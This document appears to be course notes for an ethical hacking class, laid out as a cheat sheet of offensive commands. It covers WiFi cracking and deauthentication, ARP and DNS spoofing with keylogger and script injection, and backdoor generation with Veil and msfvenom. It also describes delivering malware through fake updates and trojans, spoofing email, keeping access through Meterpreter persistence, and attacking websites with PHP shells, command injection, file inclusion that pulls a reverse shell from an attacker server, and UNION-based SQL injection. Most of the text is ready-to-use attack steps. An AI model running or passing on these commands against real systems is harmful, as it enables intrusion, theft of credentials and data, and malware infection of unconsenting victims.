# Ethical Hacking Course
Here are the commands that will be used in the course

[Fluxion](https://github.com/FluxionNetwork/fluxion)

[Airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon)

`apt-get install firmware-atheros`
# Network
## Change MAC Address
* Get the interface down
  * `ifconfig wlan0 down`
* Use macchanger
  * `macchanger --random wlan0`
  * `ifconfig wlan0 hw ether 00:11:22:33:44:55`
* Get the interface up
  * `ifconfig wlan0 up`
## Change Wireless Card Mode
### Method 1
* Start Monitor Mode
  * `airmon-ng start wlan0`
* Stop Monitor Mode
  * `airmon-ng stop wlan0mon`
### Method 2
* Get the interface down
  * `ifconfig wlan0 down`
* Change Mode
  * `iwconfig wlan0 mode monitor`
* Get the interface up
  * `ifconfig wlan0 up`
### Method 3
* Get the interface down
  * `ifconfig wlan0 down`
* Kill Process
  * `airmon-ng check kill`
* Start Monitor Mode
  * `airmon-ng start wlan0`
* Restart Network Manager
  * `service NetworkManager restart`
## Packet Sniffing
[Airodump-ng](https://www.aircrack-ng.org/doku.php?id=airodump-ng)
* Start Sniffing
  * `airodump-ng wlan0mon`
* Sniff In A Specific Network
  * `airodump-ng --channel <network channel> --bssid <network bssid> --write <file-name> wlan0mon`
* Deauth Attacks
  * `aireplay-ng --deauth <num-of-packets> -a <network bssid> -c <target bssid> wlan0mon`
## Crack WEP
### Busy Network
* Start airodump-ng in the target network
* Crack
  * `aircrack-ng <network-file>`
### NOT Busy Network
* Associate with the target network (tell the network that I wnat to connect to it)
* Fake Auth (Associate)
  * `aireplay-ng --fakeauth 0 -a <network bssid> -h <wireless adapter MAC> wlan0mon`
* Packet Injection
  * `aireplay-ng --arpreplay -b <network bssid> -h <wireless adapter MAC> wlan0mon`
## Crack WPA/WPA2
### With WPS
* If wash is not working
  * `mkdir /etc/reaver`
* Check if the network has WPS
  * `wash -i wlan0mon`
* Associate with the target network with a delay of 30s
* Attack
  * `reaver -b <network bssid> -c <network channel> -i wlan0mon -vvv --no-associate`
* If you get an error get an [older version of reaver](https://files.fm/u/z5ha7t93)
### Without WPS
* Start airodump-ng in the target
* Deauth a client to capture the WPA Hanshake
* Crack the Key
  * `aircrack-ng <handshake-file> -w <word-list>`
### Create a Wordlist
`crunch <min-length> <max-length> <characters> -o <file-name> -t <pattern>`
## Information Gathering
After authenticating to a network you gather information about it.
### Using Netdiscover
* `netdiscover -r <network internal IP>.1/24 -i wlan0`
### Using Autoscan
* download [Autoscan](http://autoscan-network.com/download)
* add 32bit compatibility `dpkg --add-architecture i386`
* update `apt-get update`
* download and install library `apt-get install libc6:i386`
* install Autoscan in the terminal running `./<downaloaded file>`
* run Autoscan
### Using Nmap (Zenmap)
* run `zenmap`
* in Target put `<network internal IP>.1/24`
* play arround with Profile
## Man In The Middle (MITM) Atacks
These atacks only work with HTTP sites without HSTS
### ARP Poisoning Using arpspoof
* Tell the target client that I am the router
  * `arpsoof -i wlan0 -t <target client IP> <router IP>`
* Tell the router that I am the target client
  * `arpsoof -i wlan0 -t <router IP> <target client IP>`
* Enable IP forward to allow packets to flow trough my device without being dropped
  * `echo 1 > /proc/sys/net/ipv4/ip_forward`
### ARP Poisoning Using MITMf
* Tell the target client that I am router
  * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0`

This way you can see all the post request made by the target client.

To bypass HTTPS request use SSLstrip to downgrade HTTPS to an HTTP request.

### Session Hijacking
If the user clicks on the "remember me" button a cookie is made in the browser. So we sniff the cookies and inject them to our browser.
* Install Ferret
  * `apt-get install ferret-sidejack`
* Become the MITM
* Capture Cookies
  * `ferret -i wlan0`
* Web GUI to see the cookies and inject them into my browser
  * `hamster`
### DNS Spoofing
* Start Apache Server
  * `service apache2 start`
  * The content of the page is in `/var/www/html`
* Edit DNS settings
  * `nano /etc/mitmf/mitmf.conf`
  * Edit the `A` record, that is responsible for translate names to IP adresses
* Become the MITM
  * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --dns`
### Capture Screen & Injecting Keylogger
* Capture Screen
  * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --screen`
* Injecting Keylogger
  * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --jskeylogger`
### Code Injection
* Inject JS
  * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --inject --js-payload "alert('hello from hacker')"`
### Fake Access Point (Honeypot) to become the MITM
* You need to have internet connection and a wireless card to broadcast it.
  * `apt install mana-toolkit`
* Edit the files bellow. Change the interface and the ssid. After change the upstream and the phy.
  * `nano /etc/mana-toolkit/hostpad-mana.conf`
  * `nano /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
* Start the network
  * `bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
### Wireshark
Use Wireshark to sniff the traffic of a network card. If tou are the MITM you can sniff the trafic of the target computet too.

# Gaining Access

## Server Side Attacks

Don't require user interaction. All is needed is the target IP.
If you can ping the IP, go and hack it.

### Information Gathering
Scan the IP with Zenmap.

### Metasploit
Metasploit is an exploit development and execution tool.

It can also be used to carry out other penetration testing tasks such as port scans, service identification and post exploitation tasks.

Payloads are small pieces of code that will be executed on the target computer ounce the vunerability has been exploited.

**Bind** payloads: open a port on the target computer and the attacker connects to that port.

**Reverse** payloads: open a port on the attacker computer and the target connects to that port. This allows to bypass firewalls.

* Run metasploit console
  * `msfconsole`
* Shows help
  * `help`
* Show exploits, payloads, auxiliaries or options
  * `show [option]`
* Use a certain exploit, payload or auxiliary
  * `use [module]`
* Configure [option] to have a value of [value]
  * `set [option] [value]`
* Run the current task
  * `exploit`

### Metasploit Community (MSFC)
Metasploit community is a GUI that can discover open ports and installed 
services on the target machine, not only that but it maps these services 
to metasploit modules and exploits and allow us to run these modules 
from the web GUI

To download it [click here](https://www.rapid7.com/products/metasploit/metasploit-community-registration.jsp)

* Start metasploit community
  * `systemctl start metasploit`
* Open the program
* Got to a browser and navigate to `https://localhost:3790`

Log in and put the activation key.

After the setup go to project, create a new project, scan the target and launch it. Then go on analysis, hosts, click on the IP, and play with the tabs.

### Nexpose
Nexpose is a vulnerability management framework, it allows us to 
discover, assess and act on discovered vulnerabilities, it also tells us a lot 
of info about the discovered vulnerabilities, weather they are exploitable 
and helps us write a report at the end of the assessment.

To download it [click here](http://www.rapid7.com/products/nexpose/compare-downloads.jsp)

* Stop postgresql
  * `systemctl stop postgresql`
* Got to the program directory
  * `cd /opt/rapid7/nexpose`
* Start the program
  * `./nsc/nsc.sh`
* Got to a browser and navigate to `https://localhost:3780`

Log in and put the activation key.

After the setup go to home, create, site, add a name, the IP in assets and a group, 
save & scan. Play with the tabs.

## Client Side Attacks
If you can't ping the target IP or it's hidden behind a router use this attack.

It requires user interaction and Social Engineering is very important 
as well as information gathering.

### Veil
Veil is a framework for generating undetectable backdoors.
A backdoor is a file that gives full access over the machine that it gets executed on.

[Click here](https://github.com/Veil-Framework/Veil) and clone it.

#### Generate a backdoor for Windows
* Got to the Veil directory and set up the program
  * `./config/setup.sh --force --silent`
* Start the program
  * `Veil.py`
* See available tools
  * `list`
* Use Evasion to create an undetectable backdoor
  * `use 1`
* See available payloads
  * `list`
* Use a playload
  * use a `meterpreter/rev_http` payload
  * `use [payload number]`
* Configure the backdoor, set Lhost to your IP
  * `set [option] [value]`
  * `options`
* Make the backdoor
  * `generate`

Check if your backdoor is being detected by anti-virus by going to
[No Distribute](https://nodistribute.com/) and upload your file.

#### Generate a backdoor for Android

`msfvenom -p android/meterpreter/[payload type(reverse_https)] LHOST=[attacker's IP] LPORT=[port] -o [file name.apk]`

### Listen for incomming connections

* Listen with metasploit
  * `msfconsole`
  * `use exploit/multi/handler`
  * `show options`
  * Set the correct the correct payload path, Lhost and Lport to your IP and the port to the port that your backdoor uses, and then exploit.

### Deliver the backdoor by a fake update

Fake an update for an already installed program.

Install backdoor instead of the update.

Requires DNS spoofing + Evilgrade (a server to serve the update).

* Install Evilgrade
* Check programs that can be hijacked
  * `show modules`
* Select a program
  * `configure [module]`
  * `show options`
* Set backdoor location and other options if you want
  * `set agent [backdoor location]`
* Start server
  * `start`
* Start dns spoofing and handler by setting any updates requests to evilgrade (your IP).

### Deliver the backdoor by backdooring downloads on the fly

Backdoor any .exe file that the target downloads using the Backdoor Factory Proxy (bdfproxy).

We need to be in the middle of the connection.

* Edit bdfproxy config file and set your IP address and proxy mode to transparent
  * ` nano /etc/bdfproxy/bdfproxy.cfg`
* Start bdfproxy
  * `bdfproxy`
* Redirect traffic to bdfoxy (the proxy is running on port 8080)
  * `iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080`
* Become the MITM
* Start listening for connections
  * `msfconsole -r /usr/share/bdfproxy/bdf_proxy_msf_resource.rc`

### Maltego - Social Engineering
Maltego is an information gathering tool that can be used to collect information about anything.
The target can be a website, company, person, and do on. You can discover entities 
associated with the taget and everything will be displayed on a nice graph.

### Make a Trojan

A Trojan is a simple file that seems to be normal but has malicious code in it, in this case a backdoor will be injected in this file.

The target will receive a file with a backdoor, when this file is opened 
the backdoor will be executed in the background.

This will be done with a download and execute script which will download 
the file and the backdoor.

In the script, change `url1` with the real file url and the `url2` with the 
backdoor url.

Then the script needs to be compiled with Autoit, software and programming language that the script was written in. 
Change the script extension to `.au3`. Select the source, destination and icon 
for the backdoored file and convert it.

### Spoof File Extensions

To spoof file extensions use the Right-to-Left Override character.
This way you can make a `.exe` file looks like a `.jpg` file.

Beacause some browser are removing this character you can compress 
the file to keep the spoofed extension.

### Spoof Emails

Email spoofing is the ability to email someone with a any email address.

This can be achived using a trusted email service to send the email.
You can use a webhosting account, create your mail server or use a SMTP server.

A good and free SMTP server is [Sendgrid](https://sendgrid.com).
Sign up for the free plan, click in integrate using SMTP relay and generate a key.

Then use the program`sendemail` to send the spoofed email.
The authentication will be done with the username and password generated by Sendgrid, 
put the from and to emails, the subject, message and the header.

`sendemail -s [server:port] -xu [user] -xp [password] -f [from email] -t [to email] -u [subject] -m [message] -o message-header="From: [name] <email>"`

### BeEf

BeEF is a Browser Exploitation Framework that allows to perform a nuber of attacks on a hooked target.
To hook someone the target needs to load a hook script generated by BeEF.

Once you start BeEF a URL for the web interface will be shown as well as the hook script.

To hook someone you can use DNS spoofing, inject the hook.js file using MITM or Social Engineer.

When the target is hooked you can execute commands on the target browser.
You can search things to do in the `Commands` tab.

Note: some commands just work in `http` protocol.

## Post Explotation

After the attacker gains access to the target computer, the attacker 
have full control over the computer, everything can be done.

### Meterpreter

* Get help
  * `help`
* Background current session
  * `background`
* List sesions
  * `sessions -l`
* Interact with a session
  * `sessions -i [session number]`
* Display system info
  * `sysinfo`
* Display interfaces info
  * `ipconfig`
  * `ifconfig`
* Show current user
  * `getuid`
* Download file
  * `download [file]`
* Upload file
  * `upload [file]`
* Execute file
  * `execute [file]`
* List processes
  * `ps`

### Migrate Process

When you hack into a it is a good idea to migrate the original process to a safer one like the `explorer` which is the graphical interface of Windows.

`migrate [PID]`

### Maintaining Access

* Method 1 - Using Veil
  * Instead of using `rev_http_service` module use `reverse_tcp_service` module.
  * But it does not always work.
* Method 2 - Using persistence module
  * In the meterpreter session run `run persistence -U -i [seconds] -p [port(80)] -r [attacker IP]`
  * This is detectable by Antiviruses.
* Method 3 - Metasploit + Veil
  * The backdor will be injected as a service and the computer will try to connect to the attacker
  every time the target powers on his computer.
  * `use exploit/windows/local/persistence`
  * `options`
  * `set EXE_NAME browser`
  * `set SESSION [session number]`
  * `show advanced`
  * `set EXE::Custom [payload path]`
  * `exploit`
  * Now you just have to listen for incomming connections and a session will be opened.
 
### Pivoting

Pivoting is the ability to use the infected machine to hack into other machines in its network.

To do this a route needs to be set up between the attacker and the target. Then the attacker will be able to attack the machines on the network.

* `use post/windows/manage/autoroute`
* `set SUBNET [target subnet]`
* `set SESSION [session id]`
* `exploit`

## Website Hacking

[Website Request](https://link.medium.com/jDR6sAyvxS)

A Website is a server that when accessed retrieves a web page.

When your browser requests a web site, the URL is translated to an IP address by a DNS server, then the IP is sent back to your computer and then the computer will connect with the server and the server will give back a response for the computer.

There can be two types of IP addresses. When the server hosts only one website this site has a **dedicated IP**. When the server hosts various websites these sites have **shared IPs**.

To hack into a website you can use a server attack if the server has any vulnerability, a client attack in the admin of the website or a web application attack.

When a website uses a Shared Web Hosting plan, if a direct attack to the website fails you can attack the other websites and after accessing the server you can go to the target website.

### Information Gathering

**Information to be collected** 
* IP Addess
* Domain name info
* Technologies used
* Other websites on the same server
* DNS records
* Sub-domains and unlisted files and directories

**Other tools to gather information**

[Whois Lookup](http://whois.domaintools.com/) to find info about the owner of the target.

[Netcraft Site Report](http://toolbar.netcraft.com/site_report?ur) to show technologies used on the target.

[Robtex DNS lookup](https://www.robtex.com) to show comprehensive info about the target website.

### Subdomains

Subdomain is a domain that is part of a larger domain. At `mail.google.com` , `mail` is the subdomain of `google.com`. Note that these are not shown in search engines. The root subdomain is `www`.

These subdomains can contain vulnerabilities that will allow to hack the website.

To find subdomains on the target use Knock.

* `git clone https://github.com/guelfoweb/knock.git`
* `cd knock/knockpy`
* `python knock.py [target website]`

### Find Files

To find files and directories on a webserver use Dirb with a wordlist to brute force file and directory names that may be on the website.

* `dirb [target website]`

After that, analyze the files and look for something useful like `robots.txt` that tells search engines how to deal with the website, it usually contains hidden files.

### Vulnerabilities

#### File Upload

This vulnerability allows the client to upload ANY file, so you can upload a shell in a programming language 
that the server understands and get control over the target.

To generate a PHP shell, Weevely can be used, 
but you can upload any file like a 
meterpreter payloads.

* Generate the payload
  * `weevely generate [password] [file 
name]`
* Upload the file
* Start the payload
  * `weevely [file url] [password]`

#### Code Execution

This vulnerability allows the client to perform operating system code on the target server.

You can run a reverse connection code and run it on the server.

Input to make a Ping (ie)

`192.168.0.1; [any command]`

#### Local File Inclusion

This allows the client to read any file that is on the target server.

It can be seen in the url, if in it there is something like 
`https://website.com/upload/?page=index.php` it means that the website is accessing a 
file on the server, so you can type any path in there and get files.

To test it try to load the `passwd` file `https://website.com/upload/?page=../../../../etc/passwd`

If the server adds the `.php` at the end of the file automatically, like so `<?php “include/”.include($_GET['filename'].“.php”); 
?>`, then you can add `%00` to the end of the string to tell to the server to ignore anything after that.

#### Remote File Inclusion

If the server turned on the functions `allow_url_include` and `allow_url_fopen`, the attacker can upload any file from any 
server to the target.

For this to work, make a php file that gives you a reverse connection to the target and save it as `.txt`. Then put 
this on you server, copy the link to the file and paste in the string like so `https://website.com/upload/?page=http://192.168.10.26/php-reverse.txt?`

### SQL Injection

SQL is the programming language for relational databases. A database is where data is stored, like username, emails and passwords.

**SQL Select Pattern**: `SELECT [columns] FROM [database].[table]`

#### Discovering SQL Injections (POST Method)

The most common places to find SQL vulnerabilities are input fields because the input passed there is execute on the server.

In a login form, for example, if there is a vulnerability in the code, you can login in the page, but you can execute SQL commands as well.

This a what a query looks like to login to retrieve information about the user that wants to login.

`SELECT * FROM accounts WHERE username='$username_input' AND password='$passwd_input'`

`*` means all columns.

To check if the website has this vulnerability try to put `'` (single quote) or `"` (double quote) in the inputs, if you get an error this website is vulnerable.

To test if the website executes queries type this in the password field:

`123456' AND 1=1#`. If this is the right password and you managed to login there is a SQL vulnerability.

`123456' AND 1=2#`. If this is the right password and you didn't login there is a SQL vulnerability as well.

You can use this pattern in any input field. Type something acceptable, type `'`, put a query and a comment sign (`#`).

The `#` sign was used to comment everything after it, so the statement will run `1=1` and stop.
Other signs like `--` and `%00` work too.

In this case, if you want to login without knowing the password, in the password field you could type: `anything' OR 1=1#`. This way if any of the statements are true it's gonna login, the password is wrong so it's false but `1=1` is true so you will be logged in.

You can login without even entering a password if you type this in the username field: `admin'#`.

#### GET Method

When the inputs are passed by GET Method they are sent in the URL like so: `https://page.com/login.php?username=hello&password=world`

So the variable `username` has a value of `hello` and `password` has a value of `world`. These variables are going to be passed to the server and run a SQL query, so you can inject code on them too.

It is important to note that when the code is been injected into the browser it has to be encoded because the URL only works with encoded characters. Search for a URL Encode Decode to encode the signs that you pass to the URL.

`%20 = (space)`

`%23 = (#)`

You can inject the `ORDER BY [clause]` SQL command as well to order the table by column-number or column-name (clause),
this way you will know how many columns that table has. Inject it like so:

`https://page.com/login.php?username=hello' ORDER BY 1 %23&password=world`

To organize the code, the only part that will be written is going to be after the username (`hello'`) and before the `%23` sign.

Go and sort the numbers till you get the highest number possible without an error. This number will be the number of columns in the table.

#### Read Database Information

After identifying how many columns the table has, the next step is to build a query to get information about the database.

To be able to combine the result of `SELECT` statements use the operator `UNION`.

When the `UNION` operator is been used all columns have to be filled up in the `SELECT` statement,
so to retrieve information set the other to `null`.

At the example above, let's suppose that the number of columns is 5. So to get the columns with `UNION` put this in the URL:

`UNION SELECT 1,2,3,4,5`

Then try some MySQL functions in the column numbers:

`UNION SELECT 1,database(),user(),version(),5`

These function will retrieve the current database, user and version of the database respectively.

#### Find Database Tables

The `information_schema` database is a default database created by MySQL and it contains information about all other databases.

To get all the tables from that database perform:

`UNION SELECT null,table_name,null,null,null from information_schema.tables`

This will select the column `table_name` from the table `tables` of the database `information_schema`.

To get all the table names from a database perform:

`UNION SELECT null,table_name,null,null,null from information_schema.tables where table_schema='[database name]'`

To get the columns of a table from a database perform:

`UNION SELECT null,column_name,null,null,null from information_schema.columns where table_name='[table name]'`

To get content in the columns from a table from a database perform:

`UNION SELECT null,[column name],null,null,null from [table name]`

#### Read and Write Files On The Server

With these functions the database can read and write files on the server. To see it perform:

`UNION SELECT null,load_file('/etc/passwd'),null,null,null`

`UNION SELECT null,'anything to be written in the server',null,null,null into outfile '/var/www/html/file.txt'`

If you don't have permissions to write a file in that directory just write in another one.

#### Extract Data With SQLmap

SQLmap is a tool that automates the search for vulnerabilities on the target server.

Type `sqlmap --help` to see options and use these options to attack the server.

* Run SQLmap
  * `sqlmap -u "[target url]"`
* Get current databases
  * `sqlmap -u "[target url]" --dbs`
* Get current user
  * `sqlmap -u "[target url]" --current-user`
* Get current database
  * `sqlmap -u "[target url]" --current-database`
* Get tables
  * `sqlmap -u "[target url]" --tables -D [database name]`
* Get columns
  * `sqlmap -u "[target url]" --columns -T [table name] -D [database name]`
* Get data of the columns
  * `sqlmap -u "[target url]" --dump -T [table name] -D [database name]`
